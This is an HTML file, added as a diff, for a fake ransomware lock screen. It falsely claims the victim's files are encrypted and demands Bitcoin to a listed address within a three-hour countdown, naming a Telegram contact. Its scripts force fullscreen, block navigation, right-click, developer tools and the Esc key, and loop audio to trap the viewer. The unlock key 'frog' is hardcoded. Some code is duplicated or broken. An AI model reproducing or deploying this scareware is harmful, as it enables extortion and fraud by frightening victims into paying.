@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <style >
+ #middle-div {
+  position: flexbox;
+  top: 50%;
+  left: 50%;
+  bottom: 
+  transform: translate(-50%, -50%);
+  background-color: black  ; /* optional */
+  padding: 20px; /* optional */
+}
+
+ img {
+  width: 23%; /* adjust the width to your liking */
+  margin: 30px; /* add some margin to separate the image from the text */
+}
+ #timer {
+      font-size: 128px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+body {
+      background-color: black;
+      font-family:sans-serif;
+      color:red;
+      font-family: Arial, sans-serif;
+      cursor: none; /* Hide mouse cursor */
+      margin: 0; /* Remove default margin */
+      padding: 0; /* Remove default padding */
+      height: 100vh; /* Set height to full viewport height */
+      display: flex; /* Use flexbox to center content */
+      justify-content: center; /* Center horizontally */
+      align-items: center; /* Center vertically */
+    }
+ }
+ 
+ .noselect {
+  -webkit-user-select: none; /* Safari, Chrome */
+  -moz-user-select: none; /* Firefox */
+  -ms-user-select: none; /* IE, Edge */
+  user-select: none; /* Standard syntax */
+}
+
+.nodrag {
+  -webkit-user-drag: none; /* Safari, Chrome */
+  -moz-user-drag: none; /* Firefox */
+  -ms-user-drag: none; /* IE, Edge */
+  user-drag: none; /* Standard syntax */
+}
+
+ </style>
+ 
+ <script>
+// Create a button element
+var button = document.createElement('button');
+button.textContent = 'Load Webpage';
+button.onclick = function() {
+  // Load the webpage
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://www.example.com', true); // Replace with the URL you want to load
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      // Remove the button
+      button.remove();
+
+      // Add the webpage content to the page
+      document.body.innerHTML = xhr.responseText;
+    }
+  };
+  xhr.send();
+};
+
+// Add the button to the page
+document.body.appendChild(button);
+
+
+ </script>
+ <script>
+ // fullscreen 
+document.addEventListener('DOMContentLoaded', function() {
+  function openFullScreen() {
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen();
+    } else if (document.documentElement.mozRequestFullScreen) {
+      document.documentElement.mozRequestFullScreen();
+    } else if (document.documentElement.webkitRequestFullScreen) {
+      document.documentElement.webkitRequestFullScreen();
+    }
+    document.removeEventListener('click', openFullScreen);
+  }
+  document.addEventListener('click', openFullScreen);
+});
+
+ // timer 
+    // Get the start time from local storage
+    var startTime = localStorage.getItem("startTime");
+    if (!startTime) {
+      // If no start time is found, set a new start time and store it in local storage
+      startTime = new Date().getTime();
+      localStorage.setItem("startTime", startTime);
+    } else {
+      startTime = parseInt(startTime);
+    }
+    var remainingTime = 3 * 60 * 60 * 1000 - (new Date().getTime() - startTime);
+    setInterval(function() {
+      remainingTime -= 1000;
+      if (remainingTime <= 0) {
+        document.getElementById("timer").innerHTML = "Time's up!";
+        remainingTime = 0;
+        localStorage.removeItem("startTime");
+      } else {
+ 
+        var hours = Math.floor(remainingTime / (60 * 60 * 1000));
+        var minutes = Math.floor((remainingTime % (60 * 60 * 1000)) / (60 * 1000));
+        var seconds = Math.floor((remainingTime % (60 * 1000)) / 1000);
+
+        // Display the timer
+        document.getElementById("timer").innerHTML = hours + ":" + minutes + ":" + seconds;
+      }
+    }, 1000);
+    
+    //mouse and keyboard hidden
+    
+    // Buat objek audio
+var audio = new Audio('time.mp3');
+var isLooping = false;
+
+// Tambahkan event listener untuk memutar audio
+document.addEventListener('click', function playAudio() {
+  // Memutar audio
+  audio.play();
+  
+  // Atur properti loop untuk memutar audio secara berulang
+  audio.loop = true;
+  isLooping = true;
+  
+  // Hapus event listener jika audio sudah diputar dalam loop
+  if (isLooping) {
+    document.removeEventListener('click', playAudio);
+  }
+});
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    //disable navbar android 
+    
+    // Disable navigation on mobile devices
+document.addEventListener('touchmove', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('touchstart', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('touchend', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('touchcancel', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('gesturestart', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('gesturechange', function(event) {
+  event.preventDefault();
+});
+
+document.addEventListener('gestureend', function(event) {
+  event.preventDefault();
+});
+
+// Disable back button
+window.addEventListener('popstate', function(event) {
+  window.history.forward();
+});
+
+window.addEventListener('load', function(event) {
+  window.history.forward();
+});
+
+    
+    //disable scroll
+    // Disable navigation on mobile devices
+window.addEventListener('scroll', function(event) {
+  window.scrollTo(0, 0);
+});
+
+window.addEventListener('touchmove', function(event) {
+  event.preventDefault();
+});
+
+// Disable back button
+window.history.pushState(null, null, window.location.href);
+window.addEventListener('popstate', function(event) {
+  window.history.pushState(null, null, window.location.href);
+});
+
+
+//calculate
+
+
+
+// Melarang user untuk meneklik tombol kanan mouse
+document.addEventListener('contextmenu', function(event) {
+  event.preventDefault();
+});
+
+// Melarang user untuk debug mode
+document.addEventListener('keydown', function(event) {
+  if (event.keyCode === 123) { // F12
+    event.preventDefault();
+  }
+  if (event.ctrlKey && event.shiftKey && event.keyCode === 73) { // Ctrl + Shift + I
+    event.preventDefault();
+  }
+});
+
+// Melarang user untuk meneklik tombol kanan mouse pada input
+document.addEventListener('contextmenu', function(event) {
+  if (event.target.tagName === 'INPUT') {
+    event.preventDefault();
+  }
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+//text box 
+
+
+        
+      
+       function checkAnswer() {
+    var answer = document.getElementById("answer").value;
+    var correctAnswer = "frog";
+
+    if (answer.toLowerCase() === correctAnswer) {
+        window.location.href = "https://www.example.com"; // redirect to a new page
+    } else {
+        document.getElementById("answer").innerHTML = "WRONG KEY !!!";
+        document.getElementById("answer").value = ""; // clear the input field
+        document.getElementById("answer").focus(); // keep focus on the input field
+        setTimeout(function() {
+            document.getElementById("result").innerHTML = "";
+        }, 3000); // clear the message after 3 seconds
+             
+           for (let i = 20; i <= 30000000; i *= 1.2) {
+            console.log(i);
+}
+       
+    }
+}
+
+
+
+// Listen for Esc key press
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'Escape') {
+    event.preventDefault(); // Prevent default Esc key behavior
+    alert('THERE IS NO ESCAPE!');
+  }
+});
+
+// Listen for F5 key press
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'F5') {
+    event.preventDefault(); // Prevent default F5 key behavior
+    alert('You pressed the F5 key!');
+  }
+});
+
+
+
+        //
+
+
+
+// Create a notification element
+const notification = document.createElement('div');
+notification.classList.add('notification');
+notification.textContent = 'You pressed the Esc key!';
+document.body.appendChild(notification);
+
+// Listen for Esc key press
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'Escape') {
+    event.preventDefault(); // Prevent default Esc key behavior
+    notification.textContent = 'You pressed the Esc key!';
+    notification.classList.add('active');
+    setTimeout(function() {
+      notification.classList.remove('active');
+    }, 3000);
+  }
+});
+
+// Listen for F5 key press
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'F5') {
+    event.preventDefault(); // Prevent default F5 key behavior
+    notification.textContent = 'You pressed the F5 key!';
+    notification.classList.add('active');
+    setTimeout(function() {
+      notification.classList.remove('active');
+    }, 3000);
+  }
+});
+
+
+   
+
+         // Tambahkan event listener untuk mengklik layar
+document.addEventListener('click', function() {
+  // Periksa apakah layar sudah full screen
+  if (document.fullscreenElement === null) {
+    // Jika layar belum full screen, maka buat full screen
+    document.documentElement.requestFullscreen();
+  } else {
+    // Jika layar sudah full screen, maka kembalikan ke ukuran normal
+    document.exitFullscreen();
+  }
+  // Tambahkan event listener lagi untuk mengklik layar
+  document.addEventListener('click', arguments.callee);
+});
+
+
+// Melarang user untuk meneklik tombol kanan mouse
+document.addEventListener('contextmenu', function(event) {
+  event.preventDefault();
+});
+
+// Melarang user untuk debug mode
+document.addEventListener('keydown', function(event) {
+  if (event.keyCode === 123) { // F12
+    event.preventDefault();
+  }
+  if (event.ctrlKey && event.shiftKey && event.keyCode === 73) { // Ctrl + Shift + I
+    event.preventDefault();
+  }
+});
+
+// Melarang user untuk meneklik tombol kanan mouse pada input
+document.addEventListener('contextmenu', function(event) {
+  if (event.target.tagName === 'INPUT') {
+    event.preventDefault();
+  }
+});
+
+
+
+
+        // generate calculation for slowing ram usage 
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+  </script>
+  <meta charset="UTF-8">
+  <title>Ransomware Message</title>
+</head>
+<body>
+    <p class="noselect">
+  <div id="middle-div">
+    <div id="timer"><h1></h1></div>
+    <div id="key-text">
+    </p>
+    
+    
+    
+    </div>
+       <p class="noselect">
+    <p><h1>ATTENTION: THIS COMPUTER HAS BEEN INFILTRATED BY E3222SP RANSOMWARE </h1></p>
+    <p>We have taken control of your system and encrypted all of your files, including your important documents, photos, and videos. You will not be able to access any of your data until you comply with our demands. </p>
+    <p>Pay 0.002 Bitcoin to   [ bc1qg2nhmvs20hrp27cj7ug647584uhecjrd87vdfu ]</p>
+    <p>You have 3 hours to make the payment.</p>
+    <p>Do not attempt to decrypt your files or seek people help </p>
+    <p>INSTRUCTIONS:</p>
+    <p style="color: green;">> Contact us on https://t.me/KANAyy122 for instructions.</p>
+     <h1>Enter the key :</h1>
+    <input type="text" id="answer" onkeypress="checkEnter(event)" autofocus />
+    <button onclick="checkAnswer()">Submit</button>
+    <p>WARNING:</p>
+    
+    <p>Any attempts to decrypt use fake key will result in permanent loss of data.<br>
+    <p> Any input from keyboard will be log in file </p>
+    <p>Do not shut down or restart your computer it will be result in permanent data lost </p>
+    <p> 
+  </div>
+  <div id="sideqr">
+    <img src="lock.png">
+      <img src="suport1.jpg">
+  </div>
+ 
+</body>
+</html>
+
